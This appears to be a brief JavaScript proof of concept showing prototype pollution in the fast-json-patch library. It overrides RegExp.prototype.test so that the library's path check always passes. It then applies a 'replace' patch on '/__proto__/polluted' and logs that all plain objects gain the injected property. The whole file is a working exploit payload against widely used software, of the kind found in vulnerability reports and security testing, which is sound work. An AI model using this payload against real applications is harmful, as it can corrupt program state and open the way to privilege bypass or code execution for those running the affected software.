RegExp.prototype.test = () => true;
let fp = require('fast-json-patch');
const patch = [{
        op: 'replace',
        path: '/__proto__/polluted',
        value: 'yes'
    }];
console.log({}.polluted);
fp.applyPatch({}, patch);
console.log({}.polluted);